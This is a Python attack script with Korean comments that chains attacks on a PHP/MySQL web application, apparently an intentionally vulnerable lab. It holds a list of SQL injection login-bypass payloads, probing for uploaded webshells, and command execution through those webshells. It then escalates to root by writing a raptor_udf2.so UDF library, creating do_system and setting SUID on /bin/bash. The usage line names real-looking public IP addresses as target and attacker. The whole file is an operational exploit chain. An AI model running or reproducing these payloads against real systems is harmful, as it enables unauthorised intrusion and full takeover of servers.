#!/usr/bin/env python3
"""
SQL Injection 우회 버전 - post_exploit.py
"""

import requests
import sys
import time
from urllib.parse import quote

class PostExploiter:
    def __init__(self, target_ip, attacker_ip, attacker_port):
        self.target_ip = target_ip
        self.attacker_ip = attacker_ip
        self.attacker_port = attacker_port
        self.webshell_url = None
        self.webshell_name = None
        self.webshell_param = "cmd"
        self.session = requests.Session()

    def login(self):
        """SQL Injection 우회 버전"""
        print("[*] SQL Injection (우회 버전) 시도 중...")

        login_url = f"http://{self.target_ip}/login.php"

        # 확장된 우회 페이로드
        payloads = [
            # 기본 페이로드
            ("admin", "' or '1'='1' --"),
            ("admin", "' or '1'='1"),
            ("admin", "' or 1=1 --"),
            ("admin", "' or 1=1#"),

            # 주석 우회
            ("admin' --", "anything"),
            ("admin'--", "anything"),
            ("admin' #", "anything"),
            ("admin'#", "anything"),
            ("admin'/*", "anything"),

            # OR 우회
            ("admin' OR '1'='1", ""),
            ("admin') OR '1'='1' --", ""),
            ("admin')) OR '1'='1' --", ""),

            # 대소문자 혼합
            ("admin' Or '1'='1' --", ""),
            ("admin' oR '1'='1' --", ""),
            ("aDmIn' OR '1'='1' --", ""),

            # 공백 우회 (/**/ 사용)
            ("admin'/**/OR/**/'1'='1'--", ""),
            ("admin'/**/or/**/1=1--", ""),

            # 쿼리 스택킹
            ("admin'; --", ""),
            ("admin';", ""),

            # UNION 기반
            ("' UNION SELECT NULL,username,password,NULL,NULL FROM users WHERE username='admin' --", ""),

            # 간단한 True 조건
            ("admin' or true --", ""),
            ("admin' or 'a'='a' --", ""),

            # 숫자형 필드인 경우
            ("1 or 1=1 --", ""),
            ("0 or 1=1 --", ""),

            # 이중 쿼리
            ("admin'||(select 1)||'", ""),
        ]

        for username, password in payloads:
            try:
                print(f"[*] 시도: username={username[:30]}, password={password[:30]}")

                data = {
                    'username': username,
                    'password': password
                }

                resp = self.session.post(login_url, data=data, timeout=10, allow_redirects=True)

                # 로그인 성공 확인
                if 'login.php' not in resp.url and resp.status_code == 200:
                    print(f"[+] 로그인 성공!")
                    print(f"    Username: {username}")
                    print(f"    Password: {password}")
                    return True

                # 추가 체크: 쿠키 확인
                if 'PHPSESSID' in self.session.cookies:
                    # 세션 테스트
                    test_resp = self.session.get(f"http://{self.target_ip}/index.php")
                    if 'login' not in test_resp.url.lower():
                        print(f"[+] 세션 기반 로그인 성공!")
                        return True

            except Exception as e:
                print(f"[-] 에러: {e}")
                continue

        print("[-] 모든 페이로드 실패")
        return False

    def find_webshell(self):
        """업로드된 웹쉘 찾기"""
        print("[*] 웹쉘 찾는 중...")

        # 웹쉘 파일명 확장 리스트
        shell_names = [
            "mysql_udf_shell.php5",  # 새로 업로드한 것
            "shell.php5",
            "shell_advanced.phtml",
            "shell.jpg",
            "shell.php",
            "shell.php3",
            "shell.php4",
            "shell.phtml",
            "shell.phps",
            "shell.phar",
            "shell98.php5",
        ]

        # file.php를 통한 접근
        base_url = f"http://{self.target_ip}/file.php"

        for shell_name in shell_names:
            try:
                # cmd 파라미터 시도
                test_url = f"{base_url}?name={shell_name}&cmd=whoami"
                resp = self.session.get(test_url, timeout=5)

                if resp.status_code == 200 and 'apache' in resp.text.lower():
                    self.webshell_url = base_url
                    self.webshell_name = shell_name
                    self.webshell_param = "cmd"
                    print(f"[+] 웹쉘 발견: {test_url}")
                    print(f"[+] 응답: {resp.text[:100]}")
                    return True
            except:
                pass

        print("[-] 웹쉘을 찾을 수 없습니다")
        return False

    def execute_command(self, cmd):
        """웹쉘을 통해 명령 실행"""
        if not self.webshell_url:
            return None

        try:
            params = {
                'name': self.webshell_name,
                self.webshell_param: cmd
            }
            resp = self.session.get(self.webshell_url, params=params, timeout=10)
            return resp.text
        except Exception as e:
            print(f"[-] 명령 실행 실패: {e}")
            return None

    def mysql_root_exploit(self):
        """MySQL root로 UDF 권한 상승"""
        print("\n" + "="*60)
        print("MySQL Root UDF 권한 상승")
        print("="*60)

        print("\n[*] MySQL root 비밀번호: vulnerable123")
        print("[*] UDF 권한 상승 시도 중...\n")

        commands = [
            "mysql -u root -p'vulnerable123' vulnerable_sns -e \"SELECT * FROM udf_temp INTO DUMPFILE '/usr/lib64/mariadb/plugin/raptor_udf2.so';\"",
            "mysql -u root -p'vulnerable123' -e \"CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';\"",
            "mysql -u root -p'vulnerable123' -e \"SELECT do_system('chmod u+s /bin/bash');\"",
            "ls -la /bin/bash",
        ]

        for cmd in commands:
            print(f"[*] 실행: {cmd}")
            result = self.execute_command(cmd)
            if result:
                print(f"[+] 결과:\n{result}\n")
            time.sleep(1)

        print("[*] SUID bash 확인:")
        result = self.execute_command("/bin/bash -p -c 'whoami && id'")
        if result and 'root' in result:
            print(f"[+] ROOT 획득 성공!\n{result}")
            return True
        else:
            print("[-] 권한 상승 실패")
            return False

    def run(self):
        """전체 실행"""
        print("="*60)
        print("POST-EXPLOITATION (우회 버전)")
        print("="*60)

        # 로그인
        if not self.login():
            print("[-] 로그인 실패")
            print("\n[*] 수동 확인:")
            print(f"    1. 브라우저에서 http://{self.target_ip}/login.php 접속")
            print("    2. admin / hacked 로 로그인 시도")
            print("    3. 웹쉘 직접 접근: http://{self.target_ip}/file.php?name=mysql_udf_shell.php5&cmd=whoami")
            return False

        # 웹쉘 찾기
        if not self.find_webshell():
            print("\n[-] 웹쉘 찾기 실패")
            print("[*] 직접 URL 확인:")
            print(f"    http://{self.target_ip}/file.php?name=mysql_udf_shell.php5&cmd=whoami")
            return False

        # MySQL Root 권한 상승
        self.mysql_root_exploit()

        print("\n[+] Post-exploitation 완료!")
        return True


if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("사용법: python3 post_exploit_bypass.py <TARGET_IP> <ATTACKER_IP> <ATTACKER_PORT>")
        print("예: python3 post_exploit_bypass.py 3.34.181.145 13.158.67.78 4444")
        sys.exit(1)

    target_ip = sys.argv[1]
    attacker_ip = sys.argv[2]
    attacker_port = int(sys.argv[3])

    exploiter = PostExploiter(target_ip, attacker_ip, attacker_port)
    exploiter.run()
